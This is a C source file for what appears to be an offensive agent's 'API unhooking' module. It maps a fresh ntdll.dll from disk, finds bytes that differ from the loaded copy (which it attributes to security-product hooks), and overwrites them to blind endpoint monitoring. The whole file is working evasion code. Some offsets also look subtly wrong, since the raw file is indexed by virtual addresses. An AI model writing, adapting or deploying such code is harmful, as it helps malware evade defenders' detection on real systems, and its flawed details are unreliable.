/*
 * JOCKY Spectre Agent — API Unhooking
 * Reads fresh ntdll from disk, compares .text section against in-memory
 * copy, restores original bytes where hooks are detected.
 *
 * Compiled with: cl /O2 /GS- unhook.c
 */

#include <windows.h>
#include <winternl.h>

typedef struct _HOOK_INFO {
    PVOID   address;
    BYTE    originalBytes[16];
    BYTE    hookedBytes[16];
    LPCSTR  functionName;
    DWORD   offset;
} HOOK_INFO;

typedef struct _UNHOOK_RESULT {
    DWORD   hooksDetected;
    DWORD   hooksRestored;
    HOOK_INFO hooks[64];
} UNHOOK_RESULT;

/* Read fresh ntdll.dll from disk and map it for comparison */
static PVOID load_clean_ntdll(void) {
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;

    DWORD fileSize = GetFileSize(hFile, NULL);
    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    PVOID mapped = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

    CloseHandle(hMapping);
    CloseHandle(hFile);
    return mapped;
}

/* Find .text section boundaries in a PE image */
static BOOL find_text_section(PVOID base, PVOID *textStart, DWORD *textSize) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)base + dos->e_lfanew);

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            *textStart = (BYTE*)base + section[i].VirtualAddress;
            *textSize  = section[i].Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

/* Compare in-memory ntdll .text with clean copy from disk.
 * Any difference = hook installed by security product. */
BOOL unhook_ntdll(UNHOOK_RESULT *result) {
    result->hooksDetected = 0;
    result->hooksRestored = 0;

    /* Get in-memory ntdll base */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    /* Load clean copy from disk */
    PVOID cleanNtdll = load_clean_ntdll();
    if (!cleanNtdll) return FALSE;

    /* Find .text sections in both copies */
    PVOID memText, diskText;
    DWORD memSize, diskSize;

    if (!find_text_section(hNtdll, &memText, &memSize)) goto cleanup;
    if (!find_text_section(cleanNtdll, &diskText, &diskSize)) goto cleanup;

    DWORD compareSize = (memSize < diskSize) ? memSize : diskSize;

    /* Byte-by-byte comparison of .text sections */
    for (DWORD i = 0; i < compareSize; i++) {
        BYTE memByte  = ((BYTE*)memText)[i];
        BYTE diskByte = ((BYTE*)diskText)[i];

        if (memByte != diskByte) {
            /* Hook detected — record and scan for function boundary */
            if (result->hooksDetected < 64) {
                HOOK_INFO *info = &result->hooks[result->hooksDetected];
                info->address = (BYTE*)memText + i;
                info->offset  = i;
                memcpy(info->hookedBytes, (BYTE*)memText + i, 16);
                memcpy(info->originalBytes, (BYTE*)diskText + i, 16);
            }
            result->hooksDetected++;

            /* Restore original bytes from clean copy */
            DWORD oldProtect;
            VirtualProtect((BYTE*)memText + i, 16, PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy((BYTE*)memText + i, (BYTE*)diskText + i, 16);
            VirtualProtect((BYTE*)memText + i, 16, oldProtect, &oldProtect);
            result->hooksRestored++;

            /* Skip past the patched region */
            i += 15;
        }
    }

cleanup:
    if (cleanNtdll) UnmapViewOfFile(cleanNtdll);
    return TRUE;
}
